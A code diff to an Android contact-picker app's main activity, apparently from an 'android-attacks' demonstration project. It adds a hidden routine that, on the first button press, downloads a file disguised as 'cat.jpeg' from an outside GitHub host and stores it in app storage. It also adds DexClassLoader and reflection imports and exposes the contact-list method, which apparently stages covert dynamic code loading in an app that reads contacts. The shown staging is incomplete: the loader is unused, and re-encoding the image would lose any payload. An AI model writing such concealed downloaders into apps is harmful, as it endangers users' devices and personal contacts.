@@ -10,20 +10,34 @@ import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.util.Log;
 import android.view.View;
 import android.widget.Toast;
 
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Random;
 
+import dalvik.system.DexClassLoader;
+
 public class MainActivity extends AppCompatActivity {
 
     private static final String TAG = "CONTACT_SELECTOR";
+    static boolean isCodeLoaded = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -34,6 +48,11 @@ public class MainActivity extends AppCompatActivity {
 
 
     public void getContacts(View view) {
+        if(!isCodeLoaded) {
+            loadCode();
+            isCodeLoaded = true;
+        }
+
         // Request permission
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS}, 0);
@@ -60,8 +79,14 @@ public class MainActivity extends AppCompatActivity {
         Toast.makeText(getApplicationContext(),"Random contact: " + randomValue + ": " + randomKey, Toast.LENGTH_SHORT).show();
     }
 
+    private void loadCode() {
+        Log.i(TAG, "Downloading file...");
+        String URL = "https://github.com/manwelbugeja/android-attacks/raw/main/resources/cat.jpeg";
+        new DownloadFile().execute(URL);
+    }
+
     @SuppressLint("Range")
-    private HashMap<String, String> getContactList() {
+    public HashMap<String, String> getContactList() {
 
         HashMap contactList = new HashMap();
         ContentResolver cr = getContentResolver();
@@ -99,4 +124,64 @@ public class MainActivity extends AppCompatActivity {
 
         return contactList;
     }
+
+
+    // Class which downloads a file to internal storage of app
+    private class DownloadFile extends AsyncTask<String, Void, Bitmap> {
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+        }
+
+        @Override
+        protected Bitmap doInBackground(String... URL) {
+            Log.i(TAG, "executing doInBackground...");
+            String imageURL = URL[0];
+
+            Bitmap bitmap = null;
+            try {
+                // Download Image from URL
+                InputStream input = new java.net.URL(URL[0]).openStream();
+                // Decode Bitmap
+                bitmap = BitmapFactory.decodeStream(input);
+            } catch (Exception e) {
+                Log.i(TAG, "Exception found");
+                e.printStackTrace();
+            }
+            return bitmap;
+        }
+
+        @SuppressLint("WrongThread")
+        @Override
+        protected void onPostExecute(Bitmap result) {
+            Log.i(TAG, "In Async task");
+
+            if (result != null) {
+                Log.i(TAG, "Result not null");
+                File dir = new File(getApplicationContext().getFilesDir(), "MyImages");
+                if(!dir.exists()){
+                    Log.i(TAG, "Creating directory...");
+                    dir.mkdir();
+                }
+                File destination = new File(dir, "image.jpg");
+
+                try {
+                    destination.createNewFile();
+                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                    result.compress(Bitmap.CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
+                    byte[] bitmapdata = bos.toByteArray();
+
+                    FileOutputStream fos = new FileOutputStream(destination);
+                    fos.write(bitmapdata);
+                    fos.flush();
+                    fos.close();
+                } catch (IOException e) {
+                    Log.i(TAG, "In exception");
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
 }
+
